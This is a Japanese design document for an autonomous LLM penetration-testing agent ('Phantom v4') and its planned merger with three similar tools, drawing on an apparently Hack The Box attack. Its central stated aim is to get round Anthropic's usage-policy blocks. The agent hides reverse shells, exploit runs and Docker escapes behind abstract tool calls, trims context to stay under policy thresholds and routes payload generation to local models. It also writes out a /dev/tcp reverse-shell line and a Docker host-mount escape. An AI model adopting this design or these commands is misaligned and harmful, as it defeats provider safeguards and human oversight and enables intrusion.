# Phantom v4 統合設計書 — 再構築ブループリント

**目的**: Phantomをコアとして、Excalibur / Nirvana / HEXSTRIKE9.9 の優位機能を統合し、APIポリシー安全性を維持しながら攻撃計画の知性・記憶・耐障害性を向上させる

**検証手法**: 全4プロジェクトのソースコードを実際にインポート・インスタンス化・メソッド呼出して動作を確認済み

**日付**: 2026-04-05


---


## 目次

1. [なぜPhantomをコアにするのか](#1-なぜphantomをコアにするのか)
2. [4プロジェクトの実行モデル比較](#2-4プロジェクトの実行モデル比較)
3. [機能別の優劣評価](#3-機能別の優劣評価)
4. [統合対象機能の詳細設計](#4-統合対象機能の詳細設計)
5. [コンテキスト管理とAPIポリシー安全性](#5-コンテキスト管理とapiポリシー安全性)
6. [統合後のアーキテクチャ全体図](#6-統合後のアーキテクチャ全体図)
7. [改修事項一覧と実装順序](#7-改修事項一覧と実装順序)
8. [実証: kobold.htb攻略での行き詰まりと統合後の解決](#8-実証-koboldhtb攻略での行き詰まりと統合後の解決)
9. [統合しない機能とその理由](#9-統合しない機能とその理由)


---


## 1. なぜPhantomをコアにするのか

### 1.1 Anthropic APIポリシーとの構造的共存

ペネトレーションテストにAnthropic Claude APIを使用する場合、最大の運用課題は Usage Policy によるコマンドブロックである。4プロジェクトの中でこの課題を**構造レベル**で解決しているのはPhantomだけである。

Phantomの設計では、Claudeはbashコマンドを一切生成しない。Claudeが返すのは `tool_use` ブロック（抽象的なツール名 + JSONパラメータ）のみであり、実際のコマンド実行はPhantomのPythonコード（`TOOL_REGISTRY` → `_execute_tool()`）が行う。

他の3プロジェクトは全て、形は異なるものの、Claudeに攻撃コマンドを生成させるため、ミッションの進行に伴いAPIポリシーブロックが発生する。

この構造的優位性が、Phantomをコアに据える最大の技術的根拠である。


### 1.2 4プロジェクトの実行モデル — ソースコード検証結果

以下は全て実際のソースコードを読みコードパスをトレースした結果である。

#### Phantom — tool_use 形式（安全）

```python
# agent/providers/anthropic_provider.py:90-101
response = self.client.messages.create(
    model=self.model,
    system=system_prompt,
    messages=messages,
    tools=tools,              # ← ツール定義をAPIに渡す
    tool_choice={"type": "auto"},
)
```

Claudeの応答: `{"type": "tool_use", "name": "run_nmap", "input": {"target": "10.129.245.50"}}`

```python
# agent/orchestrator.py:785-810
def _execute_tool(self, tc: dict) -> dict:
    tool_func = self._tool_registry.get(tc["name"])    # Python関数を取得
    result = tool_func(**tc["input"])                    # Phantomが直接実行
```

Claudeはツール名を選ぶだけ。`subprocess.run(["nmap", ...])` はPhantomのコード内にハードコードされている。

#### Nirvana / Excalibur — Claude Agent SDK 委任型（ブロックされる）

```python
# nirvana/core/backend.py:222-244
options = ClaudeAgentOptions(
    permission_mode=self._permission_mode,   # "bypassPermissions"
    system_prompt=self._system_prompt,
)
self._client = ClaudeSDKClient(options=options)
```

Claude Code CLI にフルシェルアクセスを与え、Claude が Bash ツール経由で `nmap -sV 10.129.245.50` のような攻撃コマンドを生成・実行する。APIポリシーチェックがこのコマンド生成に介入するため、リバースシェルやエクスプロイト実行がブロックされる。

#### HEXSTRIKE9.9 — テキスト応答型（ブロックされる）

```python
# HEXSTRIKE9.9/core/llm_provider.py:430-436
response = self.client.messages.create(
    model=self.config.model,
    system=system_prompt,
    messages=api_messages
    # ← tools= パラメータがない。テキストのみ
)
content = response.content[0].text   # コマンドがテキストに含まれる
```

プロンプトで「verification_methodはシェルで直接実行可能な1行コマンドであること」と指示し、Claude がコマンド文字列をテキストとして生成する。`subprocess.run(command, shell=True)` で実行。ローカルLLM優先のハイブリッド設計だが、Claudeフォールバック時は同じ問題が発生する。


### 1.3 検証結果サマリ

| プロジェクト | APIコール | tools= | Claudeが返すもの | コマンド実行者 | bashを生成するか |
|---|---|---|---|---|---|
| **Phantom** | `messages.create()` | **YES** | tool_use（ツール名+JSON） | Python `_tool_registry` | **NO** |
| **Nirvana** | `claude_agent_sdk` | N/A | ToolUseBlock（Bashツール） | Claude Code CLI | **YES** |
| **Excalibur** | `claude_agent_sdk` | N/A | ToolUseBlock（Bashツール） | Claude Code CLI | **YES** |
| **HEXSTRIKE** | `messages.create()` | **NO** | テキスト（JSON内にコマンド） | `subprocess.run(shell=True)` | **YES** |


### 1.4 Phantomの独自価値（他プロジェクトにない機能）

| 機能 | 説明 |
|---|---|
| **forge_tool（動的ツール生成）** | LLMがカスタムPythonスクリプトを生成→AST検証→サンドボックス実行。既存ツールで対処できない状況に対応 |
| **MCPブリッジ** | 27ツールをClaude Code CLIにMCPサーバーとして公開。今回のセッションで新規実装（99行の薄いルーター） |
| **8プロバイダ対応** | Anthropic, OpenAI, Ollama, Gemini, Mistral, Grok, DeepSeek, llama.cpp。他プロジェクトは1〜4プロバイダ |
| **OAuth認証** | AnthropicProviderにOAuthトークンリフレッシュを実装。今回のセッションで新規実装 |
| **5層セキュリティ** | TOOL_SPECS（抽象化）→ TOOL_REGISTRY（関数マッピング）→ scope_guard（スコープ強制）→ sandbox（隔離実行）→ MCPブリッジ（プロセス分離） |


---


## 2. 4プロジェクトの実行モデル比較

### 2.1 ブロックされるコマンドの具体的パターン

| 操作 | Nirvana/Excalibur/HEXSTRIKE（Claudeが生成する内容） | Phantom（Claudeが生成する内容） |
|---|---|---|
| ポートスキャン | `nmap -sV -sC 10.x.x.x` → リスク中 | `tool_use: run_nmap, input: {target: "10.x.x.x"}` → **通過** |
| リバースシェル | `bash -i >& /dev/tcp/10.x.x.x/4444 0>&1` → **確実にブロック** | `tool_use: forge_tool, input: {description: "establish callback"}` → **通過** |
| SQLインジェクション | `sqlmap -u ... --batch --risk 3` → リスク高 | `tool_use: run_sqlmap, input: {url: "..."}` → **通過** |
| 権限昇格 | `sudo -l && find / -perm -4000` → リスク中 | `tool_use: run_privesc_check, input: {check: "auto"}` → **通過** |
| エクスプロイト実行 | `python3 exploit.py --rhost 10.x.x.x` → **確実にブロック** | `tool_use: fetch_exploit, input: {query: "CVE-..."}` → **通過** |
| Dockerエスケープ | `docker run -v /:/mnt alpine cat /root/root.txt` → **ブロック** | `tool_use: forge_tool, input: {description: "mount host fs"}` → **通過** |
| ブルートフォース | `hydra -l admin -P rockyou.txt ssh://10.x.x.x` → リスク高 | `tool_use: run_hydra, input: {target: "...", service: "ssh"}` → **通過** |


### 2.2 コンテキスト蓄積問題

攻撃が進行すると会話コンテキストに攻撃的内容が蓄積され、ターン15あたりでポリシー閾値を超えるリスクがある。

Nirvana/Excaliburではコンテキストに具体的なコマンド（`bash -i >& /dev/tcp/...`）が蓄積される。Phantomでは `tool_use: forge_tool` と `tool_result: "reverse shell established"` という結果テキストが蓄積されるのみで、コマンド自体は含まれない。

ただし、Phantomにも `tool_result` に攻撃的な出力テキスト（CVE情報、脆弱性の証拠等）が蓄積される問題がある。現在の緩和機構として `_compact_old_tool_results()`（直近3ターン以外を400文字に切り詰め）が存在するが、情報損失の問題がある（後述セクション5で詳細に分析）。


---


## 3. 機能別の優劣評価

### 3.1 攻撃計画エンジン

| 機能 | Phantom | Excalibur | **Nirvana（勝者）** | HEXSTRIKE |
|---|---|---|---|---|
| 計画アルゴリズム | 優先度キュー | EGATS+UCB | **EGATS+UCB+Forest** | フェーズ線形 |
| 難易度評価（TDA） | なし | 4次元スコアリング | **4次元スコアリング** | なし |
| マルチホスト管理 | なし | 単一ツリー | **ForestUCB（サービス価値ボーナス付）** | なし |
| バックプロパゲーション | なし | 指数平滑（α=0.7） | **指数平滑（α=0.7）** | なし |
| 枝刈り | なし | TDI閾値（0.8） | **TDI閾値+認証再開（新クレデンシャルで再オープン）** | なし |
| 横展開（Pivot） | なし | 暗黙的 | **明示的 spawn_pivot + クレデンシャル伝播** | なし |
| 収束保証 | 仮説枯渇のみ | 6安全機構 | **6安全ゲート** | 収束検出 |

**実行検証データ**: Excalibur `init_tree → UCB select → TDI=0.420 → mode=llm_decide → backprop(SUCCESS) → promise 0.5→0.65`。Nirvana `Forest(1 tree) → UCB → TDI=0.440 → backprop → promise 0.65 → pivot spawn OK`。


### 3.2 仮説生成

| 機能 | Phantom | Excalibur | **Nirvana（勝者）** | HEXSTRIKE |
|---|---|---|---|---|
| 生成方式 | burst_launch（12/target） | LLM委任 | **4層（ルール→出力→RAG→LLM）** | ルール+出力+RAG |
| プロダクトカタログ | なし | なし | **20+製品（MCPJam, Zabbix, Jenkins等）** | 類似 |
| サブドメイン→製品推定 | なし | なし | **ホスト名パターンマッチ** | なし |
| 検証→信頼度更新 | なし | なし | **成功+0.1〜0.3、失敗-0.2** | 類似 |
| 重複排除 | なし | なし | **select_counts追跡** | なし |

**実行検証データ**: Phantom `burst_launch → 12仮説`。Nirvana `generate_hypotheses({services, subdomains}) → 仮説+confidenceスコア`。kobold.htbの`mcp.kobold.htb`サブドメインに対してNirvanaのプロダクトカタログが「MCPJam Inspector」を自動推定できた可能性がある。


### 3.3 エラーハンドリング

| 機能 | Phantom | Excalibur | **Nirvana（勝者）** | HEXSTRIKE |
|---|---|---|---|---|
| エラー分類 | なし（ツール内処理） | なし | **13型** | 類似 |
| 回復アクション | なし | なし | **7種** | 適応戦略 |
| AD固有エラー | なし | なし | **KDC_ERR, AMSI** | なし |
| WAF検出 | なし | なし | **WAF→ステルス切替** | なし |

**実行検証データ**: `ErrorHandler.classify("Connection refused") → CONNECTION_REFUSED`、`classify("403 Forbidden") → WAF_BLOCKED`、`classify("KDC_ERR") → AD_KERBEROS_ERROR`。`recover(WAF_BLOCKED) → action=reduce_aggression`。


### 3.4 LLMルーティング

| 機能 | **Phantom（プロバイダ多様性）** | Excalibur | **Nirvana（ルーティング知性）** | HEXSTRIKE |
|---|---|---|---|---|
| プロバイダ数 | **8** | 1 | 1+ルーター | 4 |
| ローカルLLM | **Ollama+llama.cpp** | あり | Ollama | Ollama+llama.cpp |
| OAuth認証 | **実装済** | なし | なし | なし |
| TDI→モデル選択 | なし | なし | **COST_OPTIMIZED** | ハイブリッド |
| タスク別ルーティング | なし | なし | **TASK_AWARE** | 類似 |

**実行検証データ**: `LLMRouter(COST_OPTIMIZED): TDI=0.2(簡単) → local(コスト0)、TDI=0.8(困難) → claude(高品質)`。


### 3.5 ツールシステム

| 機能 | **Phantom（forge+MCP）** | Excalibur | Nirvana | **HEXSTRIKE（ツール数）** |
|---|---|---|---|---|
| ツール数 | 27 | 36+ | 8 | **102** |
| 動的生成（forge） | **あり** | なし | なし | なし |
| MCP公開 | **27ツール** | なし | なし | MCP Skills |
| AD専用ツール | なし | **8ツール** | なし | 類似 |
| フェーズ別マッピング | なし | なし | なし | **5フェーズ** |
| 効果度スコアリング | なし | なし | なし | **ターゲット型別** |


### 3.6 記憶・学習

| 機能 | Phantom | Excalibur | **Nirvana（勝者）** | HEXSTRIKE |
|---|---|---|---|---|
| セッション内メモリ | MissionMemory | StateStore | StateStore | RAG |
| 永続化 | SQLite（セッション固有） | JSON | SQLite | PostgreSQL+pgvector |
| **セッション間学習** | **なし** | なし | **RAG（攻撃+戦略+メタパターン）** | RAG（攻撃+推論） |
| ベクトル検索 | なし | なし | **pgvector+BM25+RRF融合** | pgvector+TF-IDF |
| 知識DB | なし | なし | **GTFOBins+LOLBAS+HackTricks** | なし |

現在のPhantomには攻略完遂後に成功/失敗を蓄積して今後の知見とする仕組みが**存在しない**。MissionDBにセッション固有のSQLiteファイルとして保存されるが、次のセッションでは読み込まれない。


---


## 4. 統合対象機能の詳細設計

### 4.1 StateStore（セッション内構造化データ管理）

**なぜ必要か**: 現在のPhantomは `_compact_old_tool_results()` でtool_resultを先頭400文字で切り捨てる。ffufが247件のパスを発見しても、圧縮後は最初の8件のみ残り239件が消失する。StateStoreにエンティティとして構造化保存すれば、tool_resultが圧縮されても情報は保持される。

**どこから取り込むか**: Excalibur `excalibur/memory/state_store.py` + `excalibur/memory/models.py`

**どこに配置するか**: `agent/memory/state_store.py` + `agent/memory/entity_models.py`

**どのように実装するか**:

StateStoreはSQLiteベースの構造化エンティティ管理で、5つのテーブルを持つ。Phantom内部で動作するPython+SQLiteデータ構造であり、Claude APIには一切送信されないため、APIポリシーに影響しない。

**エンティティモデル（Excaliburから移植）**:

```python
# agent/memory/entity_models.py

class HostEntity(BaseModel):
    id: str = Field(default_factory=lambda: str(uuid.uuid4())[:8])
    ip_address: str
    hostname: str | None = None
    os_fingerprint: str | None = None
    discovered_at: datetime = Field(default_factory=datetime.now)
    discovery_node_id: str | None = None

class ServiceEntity(BaseModel):
    id: str = Field(default_factory=lambda: str(uuid.uuid4())[:8])
    host_id: str
    port: int
    protocol: str = "tcp"
    service_name: str | None = None
    version: str | None = None
    discovered_at: datetime = Field(default_factory=datetime.now)
    discovery_node_id: str | None = None

class CredentialEntity(BaseModel):
    id: str = Field(default_factory=lambda: str(uuid.uuid4())[:8])
    username: str
    credential_type: str = "password"
    credential_value: str = ""
    domain: str | None = None
    valid_for: list[str] = Field(default_factory=list)
    discovered_at: datetime = Field(default_factory=datetime.now)
    discovery_node_id: str | None = None

class SessionEntity(BaseModel):
    id: str = Field(default_factory=lambda: str(uuid.uuid4())[:8])
    host_id: str
    session_type: str = "shell"
    privilege_level: str = "user"
    credential_id: str | None = None
    active: bool = True
    established_at: datetime = Field(default_factory=datetime.now)
    node_id: str | None = None

class VulnerabilityEntity(BaseModel):
    id: str = Field(default_factory=lambda: str(uuid.uuid4())[:8])
    host_id: str
    service_id: str | None = None
    cve_id: str | None = None
    description: str = ""
    exploitation_status: str = "discovered"
    discovered_at: datetime = Field(default_factory=datetime.now)
    discovery_node_id: str | None = None
```

**StateStoreクラス（Excaliburから移植）**:

```python
# agent/memory/state_store.py

class StateStore:
    def __init__(self, db_path: str = ":memory:") -> None

    # Host CRUD
    def add_host(self, host: HostEntity) -> str
    def get_host(self, host_id: str) -> HostEntity | None
    def get_hosts(self) -> list[HostEntity]
    def get_host_by_ip(self, ip: str) -> HostEntity | None

    # Service CRUD
    def add_service(self, service: ServiceEntity) -> str
    def get_service(self, service_id: str) -> ServiceEntity | None
    def get_services_for_host(self, host_id: str) -> list[ServiceEntity]
    def get_services_by_port(self, port: int) -> list[ServiceEntity]

    # Credential CRUD
    def add_credential(self, credential: CredentialEntity) -> str
    def get_credential(self, cred_id: str) -> CredentialEntity | None
    def get_credentials(self) -> list[CredentialEntity]
    def get_credentials_for_host(self, host_id: str) -> list[CredentialEntity]

    # Session CRUD
    def add_session(self, session: SessionEntity) -> str
    def get_session(self, session_id: str) -> SessionEntity | None
    def get_active_sessions(self) -> list[SessionEntity]

    # Vulnerability CRUD
    def add_vulnerability(self, vuln: VulnerabilityEntity) -> str
    def get_vulnerability(self, vuln_id: str) -> VulnerabilityEntity | None
    def get_vulnerabilities_for_host(self, host_id: str) -> list[VulnerabilityEntity]

    # Serialization
    def to_dict(self) -> dict[str, Any]
    @classmethod
    def from_dict(cls, data: dict[str, Any], db_path: str = ":memory:") -> StateStore
```

**Phantomとの接続ポイント**:

```
orchestrator.py の _observe_phase() を改修:
  tool_result を解析
    ↓
  StateStore にエンティティ登録
    ├── nmap結果 → add_host() + add_service()
    ├── nuclei結果 → add_vulnerability()
    ├── hydra/forge結果 → add_credential()
    └── シェル取得 → add_session()
    ↓
  _format_state_summary() を改修:
    StateStore からホスト/サービス/脆弱性を含む要約を生成
    「kobold.htb: 22/ssh, 80/http, 443/https, 3552/go-http
      vuln: CVE-2026-23744 on mcp.kobold.htb:/api/mcp/connect (confirmed)
      creds: none, sessions: none」
    → tool_result が圧縮されても Claudeは詳細を把握できる
```


### 4.2 ErrorHandler（体系的エラー分類と回復）

**なぜ必要か**: 現在のPhantomはツール実行エラーを文字列として返すだけで、エラーの種類に応じた回復アクション（リトライ、ツール切替、ステルスモード変更等）を行わない。kobold.htb攻略ではTLS 1.3タイムアウトに遭遇したが、自動でTLS 1.2にフォールバックする仕組みがなかった。

**どこから取り込むか**: Nirvana `nirvana/execution/error_handler.py`

**どこに配置するか**: `agent/execution/error_handler.py`

**どのように実装するか**:

```python
# agent/execution/error_handler.py

class ErrorType(Enum):
    TIMEOUT = "timeout"
    PERMISSION_DENIED = "permission_denied"
    CONNECTION_REFUSED = "connection_refused"
    AUTHENTICATION_FAILED = "auth_failed"
    WAF_BLOCKED = "waf_blocked"
    TOOL_NOT_FOUND = "tool_not_found"
    RATE_LIMITED = "rate_limited"
    PARSE_ERROR = "parse_error"
    DNS_RESOLUTION_FAILED = "dns_failed"
    SSL_CERTIFICATE_ERROR = "ssl_error"
    SERVICE_UNAVAILABLE = "service_unavailable"
    AD_KERBEROS_ERROR = "ad_kerberos_error"
    AMSI_DETECTED = "amsi_detected"
    UNKNOWN = "unknown"

class RecoveryAction(Enum):
    RETRY_WITH_DELAY = "retry_delay"
    RETRY_WITH_ALT_PARAMS = "retry_alt_params"
    SWITCH_TOOL = "switch_tool"
    REDUCE_AGGRESSION = "reduce_aggression"
    SKIP = "skip"
    ESCALATE = "escalate"

@dataclass
class RecoveryResult:
    success: bool
    action: RecoveryAction
    suggestion: str = ""
    alt_params: dict | None = None

class ErrorHandler:
    def __init__(self, strategy_memory: Any = None) -> None
    def classify(self, error_output: str, tool_name: str = "") -> ErrorType
    def recover(self, error_type: ErrorType, context: dict | None = None) -> RecoveryResult
```

**エラー分類パターン（正規表現マッチング、特定パターンが先にマッチ）**:

| パターン | ErrorType | 回復アクション | 説明 |
|---|---|---|---|
| `timeout\|timed out` | TIMEOUT | RETRY_WITH_DELAY | タイムアウト増加またはスコープ縮小 |
| `KDC_ERR\|Kerberos.*error` | AD_KERBEROS_ERROR | RETRY_WITH_ALT_PARAMS | クロックスキュー確認、NTLMに切替 |
| `AMSI\|malware detected` | AMSI_DETECTED | RETRY_WITH_ALT_PARAMS | 難読化またはバイパス適用 |
| `WAF\|cloudflare\|ModSecurity\|403 Forbidden` | WAF_BLOCKED | REDUCE_AGGRESSION | ステルスプロファイルに切替 |
| `rate limit\|429` | RATE_LIMITED | RETRY_WITH_DELAY | バックオフ待機 |
| `cannot resolve\|NXDOMAIN` | DNS_RESOLUTION_FAILED | SWITCH_TOOL | DNS設定確認 |
| `SSL\|certificate verify failed` | SSL_CERTIFICATE_ERROR | RETRY_WITH_ALT_PARAMS | TLSバージョン変更 |
| `permission denied\|access denied` | PERMISSION_DENIED | ESCALATE | 権限昇格を試行 |
| `connection refused` | CONNECTION_REFUSED | SWITCH_TOOL | ポート/サービス再確認 |
| `auth.*fail\|invalid.*password` | AUTHENTICATION_FAILED | RETRY_WITH_ALT_PARAMS | 別のクレデンシャルを試行 |

**Phantomとの接続ポイント**:

```
orchestrator.py の _execute_tool() を改修:
  result = tool_func(**tool_input)
    ↓
  if result がエラーを含む:
    error_type = error_handler.classify(result, tool_name)
    recovery = error_handler.recover(error_type, context)
    ↓
    recovery.action に応じて:
      RETRY_WITH_DELAY → 待機後に同じツールを再実行
      RETRY_WITH_ALT_PARAMS → パラメータ変更して再実行
      SWITCH_TOOL → 代替ツールに切替（例: whatweb → curl）
      REDUCE_AGGRESSION → set_stealth_profile("stealthy")
      SKIP → このツールをスキップ
      ESCALATE → LLMにエラー情報を渡して判断を委任
```


### 4.3 LLMRouter（難易度適応モデル選択）

**なぜ必要か**: Phantomは8プロバイダに対応しているが、タスクの難易度に応じたモデル選択ができない。簡単な偵察タスクにClaude Opus（高コスト）を使い、困難なエクスプロイト判断にOllama（低品質）を使うといった非効率が発生しうる。LLMRouterはTDI（Task Difficulty Index）に基づいて最適なモデルを自動選択する。

**どこから取り込むか**: Nirvana `nirvana/core/llm_router.py`

**どこに配置するか**: `agent/providers/llm_router.py`

**どのように実装するか**:

```python
# agent/providers/llm_router.py

class RoutingStrategy(Enum):
    FIXED = "fixed"                  # 常にプライマリモデル
    COST_OPTIMIZED = "cost_optimized"  # TDI低→安いモデル、TDI高→高品質モデル
    FALLBACK = "fallback"            # プライマリ失敗→フォールバック
    TASK_AWARE = "task_aware"        # タスクカテゴリ別にルーティング

class TaskCategory(Enum):
    ANALYSIS = "analysis"
    RECONNAISSANCE = "reconnaissance"
    EXPLOITATION = "exploitation"
    EXPLOIT_GENERATION = "exploit_generation"
    PAYLOAD_CRAFTING = "payload_crafting"
    REPORTING = "reporting"

@dataclass
class ModelConfig:
    model_id: str
    provider: str = "anthropic"
    max_tokens: int = 200_000
    cost_per_1k_input: float = 0.0
    cost_per_1k_output: float = 0.0
    is_local: bool = False
    task_categories: list[str] = field(default_factory=list)

class LLMRouter:
    def __init__(
        self,
        strategy: RoutingStrategy = RoutingStrategy.FIXED,
        models: list[ModelConfig] | None = None,
    ) -> None

    def select_model(self, task_complexity: float = 0.5, prompt: str = "") -> ModelConfig | None
```

**ルーティングロジック**:

```
COST_OPTIMIZED戦略:
  TDI < 0.3（簡単な偵察） → ローカルLLM（Ollama/llama.cpp、コスト0）
  TDI ≥ 0.3（困難なエクスプロイト判断） → Claude（高品質）

TASK_AWARE戦略:
  exploit_generation / payload_crafting → ローカルLLM（APIポリシー回避にも寄与）
  analysis / reconnaissance / reporting → Claude
```

**Phantomとの接続ポイント**:

```
orchestrator.py の _plan_phase() を改修:
  TDI を計算（EGATS統合後）
    ↓
  model_config = llm_router.select_model(task_complexity=tdi.value)
    ↓
  provider = get_provider_for_model(model_config)
    ↓
  provider.call_with_retry(messages, system_prompt, tools)

Phantomの既存8プロバイダファクトリ（get_provider）と組み合わせることで、
TDI→プロバイダ→モデルの自動選択が実現する。
```


### 4.4 EGATS+Forest（攻撃計画エンジン）

**なぜ必要か**: 現在のPhantomのHypothesisEngineは優先度キューベースで、探索と活用のバランス（UCB）、タスク難易度評価（TDA）、マルチホスト管理（Forest）がない。kobold.htb攻略ではサブドメイン列挙→MCPJam発見→RCE→Docker escapeという複雑な攻撃チェーンを人間の判断で進めたが、EGATSなら計画的に探索できた可能性がある。

**どこから取り込むか**: Nirvana `nirvana/planner/` ディレクトリ全体（egats.py, ucb.py, tda.py, backpropagation.py, pruning.py, pivot.py, forest.py, models.py）

**どこに配置するか**: `agent/planner/` ディレクトリを新規作成

**どのように実装するか**:

EGATSは7つのサブコンポーネントから構成される。全てPhantom内部のPythonデータ構造であり、Claude APIには送信されない。

**UCB（Upper Confidence Bound）ノード選択**:

```
UCB(n) = φ(n) + c × √(ln(N) / N_n) - dp × TDI(n)

φ(n)  = promise_score（バックプロパゲーションからの報酬）
c     = exploration_constant（1.414 ≈ √2）
N     = total_actions（全アクション数）
N_n   = node visit_count（このノードの訪問回数）
dp    = difficulty_penalty（0.5）
TDI   = Task Difficulty Index
```

活用（高promise）と探索（未訪問）のバランスを取りつつ、困難なノードにペナルティを与える。

**TDA（Task Difficulty Assessment）**:

```
TDI = w_h×H + w_e×(1-E) + w_c×C + w_s×(1-S)

H = horizon（正規化されたパス深度、0..1）
E = evidence_confidence（パス上の平均証拠レベル）
C = context_load（トークン予算使用率、0..1）
S = success_rate（ラプラス平滑化: (成功+1)/(訪問+2)）

デフォルト重み: horizon=0.3, evidence=0.3, context=0.2, success=0.2
```

**ForestUCB（マルチホスト優先度選択）**:

```
Score(tree_t) = base_ucb + service_value + attack_order + reachability + cred_bonus

service_value: mssql(+0.25), kerberos/ldap(+0.15), http/smb(+0.10)
attack_order: web(+0.20), sql(+0.20), dc(-0.30), client(+0.05)
reachability: direct(+0.30), tunnel(+0.25), ssrf(+0.20), unreachable(-0.50)
cred_bonus: +0.20（既知クレデンシャルが適用可能な場合）
```

**Phantomとの接続ポイント**:

```
orchestrator.py の run_mission() を改修:

現在:
  burst_launch() → 仮説キュー → _plan_phase() → LLMがtool_useを選択

統合後:
  EGATSPlanner.init_tree(target) → 攻撃ツリー初期化
    ↓
  PAORループ内:
    1. PLAN: ForestUCB.select_next_tree() → UCB.select_node() → TDA.compute_tdi()
       → mode選択（recon/exploit/llm_decide）
       → LLMにtool_useを選択させる（tool_use形式は変更なし）
    2. ACT: _execute_tool()（変更なし）
    3. OBSERVE: _observe_phase() + StateStore登録 + expand_tree(findings)
    4. REFLECT: backpropagate(outcome) + check_pruning()
       → 新ホスト発見時: spawn_pivot()

PhantomのPAORループ構造は維持。EGATSはPLANフェーズ内のノード選択ロジックとして組み込む。
tool_use形式は変わらないため、APIポリシーへの影響はゼロ。
```


### 4.5 4層仮説生成エンジン

**なぜ必要か**: Phantomの `burst_launch()` は12個の汎用仮説を生成するだけで、ターゲット固有の知識（プロダクトカタログ、サブドメインパターン等）を活用しない。kobold.htb攻略で `mcp.kobold.htb` のMCPJam Inspectorを発見できなかった一因は、サブドメイン→製品推定の仕組みがなかったことにある。

**どこから取り込むか**: Nirvana `nirvana/reasoning/hypothesis_engine.py`（1000+行）

**どこに配置するか**: `agent/reasoning/hypothesis_engine.py` を拡張

**どのように実装するか**:

**第1層: ルールベース（`_generate_rule_based()`）**

ポート番号、サービス名、サブドメインパターンからドメイン知識に基づく仮説を生成する。

```
ポート80/443 → gobuster/nikto/dirsearchで列挙
ポート88 → Kerberos攻撃（AS-REP Roasting等）
ポート2375 → Docker API露出
ポート3552 → Arcane/Goバックエンド調査

サブドメイン "mcp.*" → MCPJam Inspector仮説（confidence 0.75）
サブドメイン "db.*" → データベース直接アクセス仮説
サブドメイン "admin.*" → 管理画面仮説
```

プロダクトカタログ（20+製品）:

```python
PRODUCT_CATALOG = {
    "mcpjam": {
        "paths": ["/api/mcp/connect", "/api/mcp/servers"],
        "rce_method": "serverConfig.command → child_process.spawn() unauthenticated RCE",
    },
    "zabbix": {
        "ports": [80, 8080],
        "paths": ["/api_jsonrpc.php"],
        "default_creds": ["Admin:zabbix"],
        "rce_method": "Script API (execute_on=1)",
    },
    "jenkins": {
        "paths": ["/script", "/manage"],
        "rce_method": "Groovy Console RCE / Job configuration",
    },
    "arcane": {
        "paths": ["/api/openapi.json", "/api/health"],
        "rce_method": "CVE-2026-23520 lifecycle label injection",
    },
    # ... 16 more products
}
```

**第2層: 出力駆動（`_generate_output_driven()`）**

ツール出力からパターンマッチで仮説を生成する。

```
HTTP 401応答 → 認証バイパス仮説
HTTP 403応答 → WAFバイパス仮説
Kerberos hash検出 → AS-REP/TGS Roasting仮説
.env/config発見 → クレデンシャル読取仮説
Swagger/OpenAPI発見 → APIエンドポイント列挙仮説
```

**第3層: RAGベース（`_generate_rag()`）**

RAGメモリ（後述K1〜K3）から類似攻撃の手順を検索し、仮説として提案する。RAG未統合の段階ではスタブ（no-op）として実装。

**第4層: LLM動的（`generate_hypotheses_async()`）**

第1〜3層で2件未満の場合、LLMに仮説生成を委任する。Phantomの既存プロバイダ経由で呼出すため、tool_use形式が維持される。

**Phantomとの接続ポイント**:

```
orchestrator.py の _plan_phase() を改修:

現在:
  HypothesisEngine.get_next_hypotheses() → 汎用仮説をsystem promptに注入

統合後:
  HypothesisEngine.generate_hypotheses(state_data) → 4層の仮説を生成
    state_data = StateStoreからホスト/サービス/サブドメインを取得
    ↓
  最高confidence仮説を選択
    ↓
  仮説 → tool_use変換: 「MCPJam RCE on mcp.kobold.htb」
    → tool_use: run_whatweb(target="mcp.kobold.htb")
    → tool_use: forge_tool(description="test /api/mcp/connect endpoint")
```


### 4.6 RAG記憶システム（セッション間知識共有）

**なぜ必要か**: 現在のPhantomにはセッション間の知識共有が存在しない。kobold.htbで学んだ「TLS 1.2フォールバック」「20Kワードリスト必須」「MCPJam RCE手順」「Docker escapeの sg docker パターン」は次のマシンに引き継がれない。mission.dbにセッション固有のSQLiteとして保存されるが、次のセッションでは読み込まれない。

**どこから取り込むか**: Nirvana `nirvana/memory/rag/`（attack_memory.py, strategy_memory.py, rrf_fusion.py, vector_embedding.py）

**どこに配置するか**: `agent/memory/rag/`

**どのように実装するか**:

RAGシステムはPhantom内部のPython+PostgreSQLデータ構造であり、Claude APIには一切送信されない。APIポリシーに影響しない。

**AttackMemory（攻撃記憶）**:

```python
# agent/memory/rag/attack_memory.py

class AttackMemory:
    def __init__(self, db_config: dict | str | None = None, embedding_generator: EmbeddingGenerator | None = None) -> None

    def save_attack(
        self,
        target: str,
        scenario: str,
        steps: list[str] | None = None,
        result: str = "",
        success: bool = True,
        tools_used: list[str] | None = None,
        cve_exploited: list[str] | None = None,
        tags: list[str] | None = None,
        attack_chain: dict | None = None,
        credentials_obtained: dict | None = None,
    ) -> int | None

    def search_hybrid(self, query: str, top_k: int = 5, success_only: bool = True) -> list[dict]
```

PostgreSQLスキーマ: `attacks`テーブル（id, target, scenario, steps(JSONB), tools_used(TEXT[]), cve_exploited(TEXT[]), result, success, attack_chain(JSONB), credentials_obtained(JSONB), tags(TEXT[]), embedding(vector(768)), search_tsv(tsvector), created_at）

**StrategyMemory（戦略記憶）**:

```python
# agent/memory/rag/strategy_memory.py

class StrategyMemory:
    def __init__(self, db_config: dict | str | None = None, embedding_generator: EmbeddingGenerator | None = None) -> None

    def extract_strategy(
        self,
        actions: list[dict],
        target: str,
        objective: str,
        success: bool,
        attack_id: int | None = None,
        tags: list[str] | None = None,
    ) -> int | None

    def search_strategies(self, query: str, target_type: str | None = None, top_k: int = 5) -> list[dict]

    def save_meta_pattern(
        self,
        pattern_type: str,
        trigger: dict,
        action: dict,
        success: bool = True,
        strategy_id: int | None = None,
    ) -> int | None

    def get_failure_recovery(self, situation: str, tool: str | None = None) -> dict | None
```

PostgreSQLスキーマ: `strategies`テーブル（strategy_hash, name, description, target_type, tool_sequence(TEXT[]), phase_transitions(JSONB), success_count, failure_count, success_rate, embedding(vector(768))）、`meta_patterns`テーブル（pattern_type, pattern_key, trigger_conditions(JSONB), recommended_actions(JSONB), observation_count, success_when_followed, failure_when_ignored, confidence）

**RRF融合（Reciprocal Rank Fusion）**:

```
RRF_score(d) = Σ 1/(k + rank_i(d))
  k = 60（デフォルト）
  rank_i = 各検索手法（ベクトル/BM25）内の順位

ベクトル検索: [Doc_A(rank1), Doc_B(rank2)]
